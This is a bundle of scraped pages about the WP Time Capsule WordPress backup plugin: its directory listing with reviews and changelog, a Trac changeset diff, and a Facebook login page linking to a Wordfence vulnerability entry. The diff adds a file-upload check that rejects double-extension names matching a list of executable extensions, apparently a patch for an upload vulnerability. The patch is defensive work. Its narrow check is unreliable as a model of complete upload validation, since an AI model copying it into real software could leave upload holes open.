2. Login to your WordPress dashboard, under Plugins click Add New
3. In the plugin repository search for ‘WP Time Capsule’ or upload the plugin zip file and install it
4. After installation, login with your wptimecapsule.com account
5. Then, connect with the cloud app that you want to use to backup your site
6. Once the cloud app is connected, you can schedule your backup time and we will begin backing up the website to your cloud app according to schedule.

## Reviews

![](https://secure.gravatar.com/avatar/3bcedfa844e7d3c9e05fcce7ea63ef171dd3e1fc2208fea2c314bd546f4aa240?s=60&d=retro&r=g)
### [–](https://wordpress.org/support/topic/its-scam-stay-away-from-this-company/)

[kezers](https://profiles.wordpress.org/kezers/ "Posts by kezers")
December 23, 2024

–

![](https://secure.gravatar.com/avatar/53f09e25adf45c535afe82f0cebc522b4f3e863919933954ec993a048aa0e7fd?s=60&d=retro&r=g)
### [High resources usage and support without solution](https://wordpress.org/support/topic/high-resources-usage-and-support-without-solution/)

[adrianpajares](https://profiles.wordpress.org/adrianpajares/ "Posts by adrianpajares")
May 15, 2024

I tested the plugin in 30 websites and the plugin uses a lot of RAM. In shared hosting for expamples blocks the accounts. In VPS uses all RAM available (more than 3GB). The plugin creates additional tables in the database with more than 30.000 or 50.000 rows and more than 50mb… After talk with support team (with many email), they don’t offert any solution. So I lost 200€ of my money… I don’t recommed it.

![](https://secure.gravatar.com/avatar/936f5c023296a3a369a76e78badcb2df337cc61d4a2d07cb5304806a8562adaf?s=60&d=retro&r=g)
### [Great Support and plugin](https://wordpress.org/support/topic/great-support-and-plugin-133/)

[scipweb](https://profiles.wordpress.org/scipweb/ "Posts by scipweb")
November 1, 2023

Ignore the people on here moaning because they don’t realise that any backup solution should be monitored regularly.
We have 130 sites working flawlessly on this best-value solution, and the support when something doesn’t work as expected is responsive and detailed. We’re very pleased with this backup regime and would heartily recommend this plugin.

![](https://secure.gravatar.com/avatar/0ab2881fc72a282455206a160d2872ad32b90d4ff01bd580c8150c03f76cbcc1?s=60&d=retro&r=g)
### [Amazing Support](https://wordpress.org/support/topic/amazing-support-791/)

[corpconv](https://profiles.wordpress.org/corpconv/ "Posts by corpconv")
October 27, 2023

Great plugin. The auto-backup-before-plugin-updates has saved me many times – makes for a quick rollback on a site if there’s an issue. Greatly appreciate the support team – they answer quickly and usually know immediately what my problem is and how to solve it, and if not, they dig in and find an answer. Great support, great plugin – we have about 100 sites using it and I wouldn’t be without it. Thank you!

![](https://secure.gravatar.com/avatar/04bf632250484c50506662b7b2abc1161dbc658730838fcd3993df695e4da623?s=60&d=retro&r=g)
### [Do not rely on this backup plugin](https://wordpress.org/support/topic/do-not-rely-on-this-backup-plugin/)

[Seitengestalter](https://profiles.wordpress.org/seitengestalter/ "Posts by Seitengestalter")
March 22, 2023
1 reply

Even if the plugin works fine in the beginning – at some point it stops working, without warning, without informing you about it, without any apparent reason. The synchronization doesn’t work anymore (for whatever reason). I have observed this now on several websites (and different web servers). Unfortunately, I even bought the lifetime license of this plugin. I would have been better off saving that money.

![](https://secure.gravatar.com/avatar/7ba40d934ac2f9e3dac767e3c6bedf81c2ceb2ed7bb06c4dbb53f8271ca86af9?s=60&d=retro&r=g)
### [faulty backups](https://wordpress.org/support/topic/faulty-backups/)

[henning2021](https://profiles.wordpress.org/henning2021/ "Posts by henning2021")
January 27, 2023

UpDate my rating from 1 to 4: The reason for the backup failure lay in Wasabi’s policies. Now the backups with large files also work.
I’ve been using the plugin for years. Since the switch from DropBox to Wasabi, the backups are not complete. Large files are not copied. The bad thing is that you only see the error in the log files. Otherwise there is no error message.

[Read all 124 reviews](https://wordpress.org/support/plugin/wp-time-capsule/reviews/)
## Contributors & Developers

“Backup and Staging by WP Time Capsule” is open source software. The following people have contributed to this plugin.

Contributors

* ![](https://secure.gravatar.com/avatar/8bbe1968fe1b6bb9f257e8202e8db8f414a585551809c0454c86be2af6eb676d?s=32&d=mm&r=g) [Moh](https://profiles.wordpress.org/dark-prince/)
* ![](https://secure.gravatar.com/avatar/103452581d4b3d07bb8eb9eedff8beb5e8f83b0d47e93178138de9358a3a1278?s=32&d=mm&r=g) [Amrit Anandh](https://profiles.wordpress.org/amritanandh/)
* ![](https://secure.gravatar.com/avatar/8ce09c3645298ce372a6f8a5c4609c33ff900c5d3baabb493f97090020da6d3b?s=32&d=mm&r=g) [WPTimeCapsule](https://profiles.wordpress.org/wptimecapsule/)

[Translate “Backup and Staging by WP Time Capsule” into your language.](https://translate.wordpress.org/projects/wp-plugins/wp-time-capsule)

### Interested in development?

[Browse the code](https://plugins.trac.wordpress.org/browser/wp-time-capsule/), check out the [SVN repository](https://plugins.svn.wordpress.org/wp-time-capsule/), or subscribe to the [development log](https://plugins.trac.wordpress.org/log/wp-time-capsule/) by [RSS](https://plugins.trac.wordpress.org/log/wp-time-capsule/?limit=100&mode=stop_on_copy&format=rss).

## Changelog

#### 1.22.23

*Release Date – 13 Nov 2024*

* Improvement : Manual decrypting of the encrypted DB file feature is improved. Now file extensions are properly checked.
* Improvement : Tested upto WP 6.7.

#### 1.22.22

*Release Date – 17 Sep 2024*

* Improvement : Manual decrypting of the encrypted DB file feature is improved. Now file extensions are properly checked.
* Improvement : Improved decoding mechanism.
* Improvement : Improved activity log for queries.
* Fix : Update in staging did not work in a few cases.
* Fix : Staging to live failed in a few cases.

#### 1.22.21

*Release Date – 11 Jul 2024*

* Improvement : Improved authentication mechanism.

#### 1.22.20

*Release Date – 03 Jul 2024*

* Improvement : Improved appID check.

#### 1.22.19

*Release Date – 21 Dec 2023*

* Improvement : The MySQL DB table ‘wptc\_current\_process’ is now changed to InnoDB engine.
* Fix : Replacing links on DB failed in rare cases during the staging process.
* Fix : Replacing links on DB failed in rare cases during the restore process.
* Fix : Handled minor PHP warning messages.

#### 1.22.18

*Release Date – 03 Oct 2023*

* Improvement : Support for new bucket regions on S3, Wasabi and Backblaze.
* Improvement : Tested upto WP 6.3.1.
* Fix : Replacing links on DB failed in rare cases during the restore process.

#### 1.22.17

*Release Date – 17 Aug 2023*

* Fix : PHP v8.2.0 fixes.
* Improvement : Tested upto WP 6.3.

#### 1.22.16

*Release Date – 03 Aug 2023*

* Fix : PHP v8.2.0 fixes.

#### 1.22.15

*Release Date – 01 Jun 2023*

* Improvement : Tested upto WP 6.2.2.
* Fix : Relative URLs on the staging site was redirected to the live site.

#### 1.22.14

*Release Date – 15 May 2023*

* Improvement : Tested upto WP 6.2.
* Improvement : WPTC now supports upto PHP v8.2.0.
* Fix : Staging did not work with sites having the “wp-config.php” file outside the WP root directory in Gridpane and other hosting providers.

#### 1.22.13

*Release Date – 25 Nov 2022*

* Fix : Staging did not work with sites having the “wp-config.php” file outside the WP root directory.
* Fix : Site paths on the “.htaccess” file were not replaced properly during staging when the WP Fastest Cache plugin is active.
* Fix : “Open base dir” error in a few cases.
* Fix : Elementor slider images failed to load on staging sites in a few cases.
* Fix : Restoration/Migration failed in a few rare cases.

#### 1.22.12

*Release Date – 02 Sep 2022*

* Fix : Restoration/Migration failed in a few rare cases.

#### 1.22.11

*Release Date – 05 Aug 2022*

* Fix : Restoration/Migration failed in a few sites having MariaDB Database.
* Fix : Child site links are not properly replaced on the staging site in a few cases.

#### 1.22.10

*Release Date – 05 May 2022*

* Improvement : New bucket region support in Backblaze cloud storage.
* Improvement : New bucket region support Wasabi cloud storage.

#### 1.22.9

*Release Date – 13 Apr 2022*

* Improvement : Dropbox TLS 2 support.
* Improvement : Improved Scheduled Backup failure emails.
* Improvement : Improved AWS S3 error messages.
* Fix : Critical error when WPTC automatic update is turned ON while the Yoast SEO plugin is active.
* Fix : Staging failed in a few cases.

#### 1.22.8

*Release Date – 17 Dec 2021*

* Fix : Restoration failed when connected to Wasabi cloud storage in a few cases.
* Fix : Automatic Backup and Update failed in a few cases.

#### 1.22.7

*Release Date – 08 Dec 2021*

* Improvement : Improved Scheduled Backup failure emails.
* Improvement : Improvements in initial setup page.

#### 1.22.6

*Release Date – 19 Oct 2021*

* Improvement : Now Schedule backup failures will be notified to the WPTC account email.
* Fix : BackBlaze cloud storage setup failed in some cases.
* Fix : S3 cloud storage setup failed in some cases.
* Fix : Staging site gave error in some cases.

#### 1.22.5

*Release Date – 01 Oct 2021*

* Improvement : Support for refresh tokens in Dropbox Cloud Storage.
* Improvement : et-cache folder is now excluded by default.
* Fix : Staging site failed in rare cases due to complicated htaccess file.
* Fix : Backup failed on AWS S3 US East North Virginia region in some cases.

#### 1.22.4

*Release Date – 24 Sep 2021*

* Improvement : Backward Compatibility for sites having PHP v7.2.3 or lower.
* Fix : Critical errors on other plugins due to conflict with WPTimeCapsule new S3 SDK.
* Fix : Critical errors when the WP site is having PHP v7.2.3 or lower.

#### 1.22.3

*Release Date – 17 Sep 2021*

* Fix : Handled fatal errors when the PHP version is < 7.2.5 and the backup is connected to S3 and S3 supported cloud storages.
* Fix : Fatal error: Undefined class constant ‘MAJOR\_VERSION’.

#### 1.22.2

*Release Date – 15 Sep 2021*

* Improvement : WPTC now supports upto PHP v8.1.0.
* Improvement : Amazon S3 SDK is now updated.
* Improvement : Wasabi and Backblaze api credentials are now encoded on the WPTC plugin settings page.
* Improvement : Support for ‘USWest02’ bucket region is added for Backblaze Cloud Storage.
* Improvement : Support for ‘AP NorthEast 1’, ‘US Central 1’ and ‘EU Central 1’ bucket regions are added for Wasabi Cloud Storage.
* Improvement : Improved the handling of MyIsam DB tables.
* Improvement : Gravity Forms upload folder is not excluded by default anymore during the backups for the newly added sites.
* Fix : “Invalid handle provided” error while trying to connect S3, Wasabi or Backblaze.
* Fix : Staging failed with “Replacing links error” in some cases.
* Fix : Restore failed in some cases.
* Fix : Few DB encryption phrase characters collapsed the UI on the WPTC plugin settings page.
* Fix : “Version Mismatch” error during automatic update or manual update in some cases.

#### 1.22.1

*Release Date – 05 Mar 2021*

* Improvement : Support for Backblaze EU regions.
* Fix : wptc\_current\_process DB table crashed in a few cases.

#### 1.22.0

*Release Date – 09 Feb 2021*

* Feature: BackBlaze B2 Cloud Storage Support.
* Improvement : Added new tables in the default exclusion list.
* Improvement : Use existing Google Drive token on the second site.
* Fix : After changing the Wasabi bucket only the changed files are backed up during the first backup.
* Fix : JS fixes related to Sweetalert.
* Fix : Handled wptc\_current\_process table crash.

#### 1.21.28

*Release Date – 12 Jan 2021*

* Improvement : Special On Demand backups for migration.
* Improvement : Support for South Africa AWS S3 bucket region.
* Fix : Divi builder was not working properly on WPTC staging sites.

#### 1.21.27

*Release Date – 13 Nov 2020*

* Fix : Restore Child site failed in some cases.
* Fix : Query recorder table got big in some cases.

#### 1.21.26

*Release Date – 22 Oct 2020*

* Fix : Minor fixes on Auto Update process.

#### 1.21.25

*Release Date – 14 Sep 2020*

* Improvement : Support for WP version 5.5.1.

#### 1.21.24

*Release Date – 03 Aug 2020*

* Improvement : Tested upto WP version 5.4.2.
* Fix : Exclude DB tables list failed to load.

#### 1.21.23

*Release Date – 17 Mar 2020*

* Improvement : Added new tables in the default exclusion list.
* Fix : Files are uploaded twice in some cases.

#### 1.21.22

*Release Date – 09 Mar 2020*

* Fix : Elementor sites’ CSS collapsed after the Restore to Staging process in some cases.

#### 1.21.21

*Release Date – 27 Feb 2020*

* Improvement : Removed .pdf files from default exclusion list.
* Fix : Elementor sites’ CSS collapsed after the migration process in some cases.
* Fix : Restoring site failed when the site Database name is renamed before taking backups.

#### 1.21.20

*Release Date – 10 Feb 2020*

* Fix : The DB table “wptc\_current\_process” becomes corrupted in some cases, which resulted in missing backups.

#### 1.21.19

*Release Date – 03 Feb 2020*

* Fix : Restore stuck in “Analyzing files to restore”.
* Fix : Migration failed when different wp prefix is given.
* Fix : Staging failed with “Replacing links error” in some cases.
* Fix : Wasabi backup failed when the bucket is created in US East 1 region.

#### 1.21.18

*Release Date – 20 Jan 2020*

* Improvement : Updated Plugin description.

#### 1.21.17

*Release Date – 14 Jan 2020*

* Fix : Google Drive duplicate files during fresh new backup.

#### 1.21.16

*Release Date – 08 Jan 2020*

* Fix : Important security fix.

#### 1.21.15

*Release Date – 23 Dec 2019*

* Fix : Update in Staging not working in few cases.

#### 1.21.14

*Release Date – 13 Dec 2019*

* Fix : Wasabi US east bucket issue during restore.
* Fix : Auto update failure, in some cases.

#### 1.21.13

*Release Date – 04 Nov 2019*

* Improvement : Major improvements in restore logic, to speed up the restore process.
* Improvement : Warning notice will be displayed, when the query recorder table gets big during realtime backup.
* Fix : Secure Auth Cookie warning is displayed in some sites, when IWP is installed.

#### 1.21.12

*Release Date – 30 Sep 2019*

* Improvement : Excluding View tables by default during real-time backups.
* Improvement : Exclude files by size option will not allow setting less than 10MB.
* Improvement : Purple admin bar for the staging site front-end.
* Improvement : Enable admin login is now disabled by default on the staging settings.
* Fix: Rollback was not working properly when two plugins have simialr names.
* Fix: Excluding the plugins, themes update automatically after update failure was not working properly.
* Fix: DB Rows Per Batch settings save was not working properly.

#### 1.21.11

*Release Date – 27 Aug 2019*

* Improvement : Google Drive retry mechanism improved.
* Improvement : Support for new S3 endpoints.
* Fix: IWP plugin updates were not handled properly.

#### 1.21.10

*Release Date – 19 Aug 2019*

* Improvement : Plugin-Server communication method had been improved and security patches have been applied.
* Fix: Sweet alert modal conflict with other plugins.

#### 1.21.9

*Release Date – 03 Jul 2019*

* Fix: Replace path error during staging in some cases.
* Fix: MainWP child site connection error, when WPTC is active.

#### 1.21.8

*Release Date – 27 Jun 2019*

* Fix: Fatal error during WPTC plugin update.

#### 1.21.7

*Release Date – 26 Jun 2019*

* Improvement: File iterator is optimized to take less load on the server.
* Improvement: Reduced unnecessary API calls during Google Drive and Dropbox uploads.
* Fix: DB backup failed on upper case WP prefix on windows server.
* Fix: Include/Exclude settings did not work correctly for upper case WP prefix.
* Fix: Update now button did not work as expected when a backup is already running.

#### 1.21.6

*Release Date – 17 May 2019*

* Improvement: Plugin name is modified now.
* Improvement: Amazon and Wasabi are the recommended storage options now.
* Fix: No. of Trigger tables count check did not exclude staging tables.
* Fix: Update now button did not trigger backup, even when Always setting is ON, when not on Agency plan.
* Fix: Version mismatch error during WP core update, on multi-site installs.
* Fix: Automatic clearing of wptc\_query\_recorder table did not work as intended.
* Fix: Complete fix for dropbox api server load error.

#### 1.21.5

*Release Date – 17 Apr 2019*

* Feature: Logout link on plan page.
* Improvement: After perform migration using WPTC backup, the site will be set as new.
* Improvement: Removed the replace site option, when a new site is created from clone using other plugins.
* Improvement: Support for new Wasabi endpoints.
* Improvement: Automatic resume of stopped restore process.
* Improvement: Dropbox API calls improved.
* Improvement: Automatic clearing of wptc\_query\_recorder table when it grows for more than a day.
* Fix: Trigger table limitation for real-time backups did not consider excluded tables.
* Fix: Update from IWP panel did not work when IWP’s Client plugin branding was ON.
* Fix: Update in staging button was visible even when whitelabel staging restriction is ON.
* Fix: Backup Before Update option was not working as expected.
* Fix: JQuery file upload plugin updated.
* Fix: Migration to other site failed when sql file is more than 5MB.

#### 1.21.4

*Release Date – 27 Mar 2019*

* Fix: Stop the Backup when Dropbox API limit is reached.

## Meta

* Version **1.22.23**
* Last updated **2 months ago**
* Active installations **20,000+**
* WordPress version **3.9.14 or higher**
* Tested up to **6.7.1**
* Tags [auto updates](https://wordpress.org/plugins/tags/auto-updates/)[backup](https://wordpress.org/plugins/tags/backup/)[migration](https://wordpress.org/plugins/tags/migration/)[staging](https://wordpress.org/plugins/tags/staging/)
* [Advanced View](https://wordpress.org/plugins/wp-time-capsule/advanced/)

## Ratings

4.1 out of 5 stars.

* [88 5-star reviews
  5 stars

  88](https://wordpress.org/support/plugin/wp-time-capsule/reviews/?filter=5)
* [6 4-star reviews
  4 stars

  6](https://wordpress.org/support/plugin/wp-time-capsule/reviews/?filter=4)
* [2 3-star reviews
  3 stars

  2](https://wordpress.org/support/plugin/wp-time-capsule/reviews/?filter=3)
* [6 2-star reviews
  2 stars

  6](https://wordpress.org/support/plugin/wp-time-capsule/reviews/?filter=2)
* [22 1-star reviews
  1 star

  22](https://wordpress.org/support/plugin/wp-time-capsule/reviews/?filter=1)

[Add my review](https://wordpress.org/support/plugin/wp-time-capsule/reviews/#new-post)

[See all reviews](https://wordpress.org/support/plugin/wp-time-capsule/reviews/)

## Contributors

* ![](https://secure.gravatar.com/avatar/8bbe1968fe1b6bb9f257e8202e8db8f414a585551809c0454c86be2af6eb676d?s=32&d=mm&r=g) [Moh](https://profiles.wordpress.org/dark-prince/)
* ![](https://secure.gravatar.com/avatar/103452581d4b3d07bb8eb9eedff8beb5e8f83b0d47e93178138de9358a3a1278?s=32&d=mm&r=g) [Amrit Anandh](https://profiles.wordpress.org/amritanandh/)
* ![](https://secure.gravatar.com/avatar/8ce09c3645298ce372a6f8a5c4609c33ff900c5d3baabb493f97090020da6d3b?s=32&d=mm&r=g) [WPTimeCapsule](https://profiles.wordpress.org/wptimecapsule/)
## Support

Issues resolved in last two months:

0 out of 1

[View support forum](https://wordpress.org/support/plugin/wp-time-capsule/)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_c026d348_20250114_220903.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F3188325)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Changeset](/changeset/3188324 "Changeset 3188324")
* [Next Changeset](/changeset/3188326 "Changeset 3188326") →

---

# Changeset 3188325

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
11/14/2024 05:58:22 AM
([2 months](/timeline?from=2024-11-14T05%3A58%3A22Z&precision=second "See timeline at 11/14/2024 05:58:22 AM") ago)

Author:
WPTimeCapsule
Message:

release 1.22.23

Location:
[wp-time-capsule/trunk](/browser/wp-time-capsule/trunk?rev=3188325)
Files:

4 edited

* [readme.txt](/browser/wp-time-capsule/trunk/readme.txt?rev=3188325 "Show entry in browser")
  (modified)
  ([2 diffs](#file0 "Show differences"))
* [wp-tcapsule-bridge/upload/php/UploadHandler.php](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?rev=3188325 "Show entry in browser")
  (modified)
  ([2 diffs](#file1 "Show differences"))
* [wp-time-capsule.php](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3188325 "Show entry in browser")
  (modified)
  ([1 diff](#file2 "Show differences"))
* [wptc-constants.php](/browser/wp-time-capsule/trunk/wptc-constants.php?rev=3188325 "Show entry in browser")
  (modified)
  ([1 diff](#file3 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [wp-time-capsule/trunk/readme.txt](/changeset/3188325/wp-time-capsule/trunk/readme.txt "Show the changeset 3188325 restricted to wp-time-capsule/trunk/readme.txt")

  | [r3153300](/browser/wp-time-capsule/trunk/readme.txt?rev=3153300#L4 "Show revision 3153300 of this file in browser") | [r3188325](/browser/wp-time-capsule/trunk/readme.txt?rev=3188325#L4 "Show revision 3188325 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 | Tags: backup, staging, migration, backup before update, auto updates. |
  | 5 | 5 | Requires at least: 3.9.14 |
  | 6 |  | Tested up to: 6.~~6.2~~ |
  | 7 |  | Stable tag: 1.22.2~~2~~ |
  |  | 6 | Tested up to: 6.7 |
  |  | 7 | Stable tag: 1.22.23 |
  | 8 | 8 | License: GPLv2 or later |
  | 9 | 9 | License URI: http://www.gnu.org/licenses/gpl-2.0.html |
  | […](/browser/wp-time-capsule/trunk/readme.txt?rev=3153300#L102) | […](/browser/wp-time-capsule/trunk/readme.txt?rev=3188325#L102) |  |
  | 102 | 102 |  |
  | 103 | 103 | == Changelog == |
  |  | 104 | = 1.22.23 = |
  |  | 105 | \*Release Date - 13 Nov 2024\* |
  |  | 106 |  |
  |  | 107 | \* Improvement : Manual decrypting of the encrypted DB file feature is improved. Now file extensions are properly checked. |
  |  | 108 | \* Improvement : Tested upto WP 6.7. |
  |  | 109 |  |
  | 104 | 110 | = 1.22.22 = |
  | 105 | 111 | \*Release Date - 17 Sep 2024\* |
* ## [wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php](/changeset/3188325/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php "Show the changeset 3188325 restricted to wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php")

  | [r3153289](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?rev=3153289#L369 "Show revision 3153289 of this file in browser") | [r3188325](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?rev=3188325#L369 "Show revision 3188325 of this file in browser") |  |
  | --- | --- | --- |
  | 369 | 369 | } |
  | 370 | 370 |  |
  |  | 371 | protected function has\_double\_extension($filename) { |
  |  | 372 | $pattern = '/\.\w+\.\w+$/i'; |
  |  | 373 |  |
  |  | 374 | return preg\_match($pattern, $filename) === 1; |
  |  | 375 | } |
  |  | 376 |  |
  |  | 377 | protected function is\_executable\_file($filename) { |
  |  | 378 | $pattern = '/\.(exe|bat|cmd|sh|msi|scr|com|cpl|dll|php|rb|pl|py|cgi|asp|aspx)/i'; |
  |  | 379 |  |
  |  | 380 | return preg\_match($pattern, $filename) === 1; |
  |  | 381 | } |
  | 371 | 382 | protected function validate($uploaded\_file, $file, $error, $index) { |
  | 372 | 383 | if ($error) { |
  | […](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?rev=3153289#L390) | […](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?rev=3188325#L401) |  |
  | 390 | 401 |  |
  | 391 | 402 | $allowed\_extesions = ['sql', 'gz', 'crypt']; |
  |  | 403 | if($this->has\_double\_extension($file->name) && $this->is\_executable\_file($file->name)){ |
  |  | 404 | $file->error = 'File is executable with double extension.'; |
  |  | 405 |  |
  |  | 406 | return false; |
  |  | 407 | } |
  | 392 | 408 |  |
  | 393 | 409 | $file\_extension = pathinfo($file->name, PATHINFO\_EXTENSION); |
* ## [wp-time-capsule/trunk/wp-time-capsule.php](/changeset/3188325/wp-time-capsule/trunk/wp-time-capsule.php "Show the changeset 3188325 restricted to wp-time-capsule/trunk/wp-time-capsule.php")

  | [r3153289](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3153289#L5 "Show revision 3153289 of this file in browser") | [r3188325](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3188325#L5 "Show revision 3188325 of this file in browser") |  |
  | --- | --- | --- |
  | 5 | 5 | Description: Backup and Staging by WP Time Capsule is an incremental schedule backup plugin that backups up your website to Dropbox, Google Drive, Amazon S3, etc. |
  | 6 | 6 | Author: Revmakx |
  | 7 |  | Version: 1.22.2~~2~~ |
  |  | 7 | Version: 1.22.23 |
  | 8 | 8 | Author URI: http://www.revmakx.com |
  | 9 |  | Tested up to: 6.~~6.2~~ |
  |  | 9 | Tested up to: 6.7 |
  | 10 | 10 | License:           GPL-2.0+ |
  | 11 | 11 | License URI:       http://www.gnu.org/licenses/gpl-2.0.txt |
* ## [wp-time-capsule/trunk/wptc-constants.php](/changeset/3188325/wp-time-capsule/trunk/wptc-constants.php "Show the changeset 3188325 restricted to wp-time-capsule/trunk/wptc-constants.php")

  | [r3153289](/browser/wp-time-capsule/trunk/wptc-constants.php?rev=3153289#L76 "Show revision 3153289 of this file in browser") | [r3188325](/browser/wp-time-capsule/trunk/wptc-constants.php?rev=3188325#L76 "Show revision 3188325 of this file in browser") |  |
  | --- | --- | --- |
  | 76 | 76 |  |
  | 77 | 77 | public function versions(){ |
  | 78 |  | $this->define( 'WPTC\_VERSION', '1.22.2~~2~~' ); |
  |  | 78 | $this->define( 'WPTC\_VERSION', '1.22.23' ); |
  | 79 | 79 | $this->define( 'WPTC\_DATABASE\_VERSION', '17.0' ); |
  | 80 | 80 | } |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=3188325)
* [Zip Archive](?format=zip&new=3188325)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from www.facebook.com_00827d42_20250115_193659.html ===

# [*Facebook*](https://www.facebook.com/ "Go to Facebook home")

| Email or phone | Password |
| --- | --- |
|  |  |  |
|  | [Forgot account?](https://www.facebook.com/recover/initiate?lwv=110&ars=royal_blue_bar) |

[Sign Up](/r.php?locale=en_US)
## Not Logged In

## Not Logged In

You are not logged in. Please login and try again.

* [Return home](/)

* English (US)
* [Gaeilge](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp- "Irish")
* [Polski](https://ga-ie.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp- "Polish")
* [Lietuvių](https://pl-pl.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp- "Lithuanian")
* [Português (Brasil)](https://lt-lt.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp- "Portuguese (Brazil)")
* [Русский](https://pt-br.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp- "Russian")
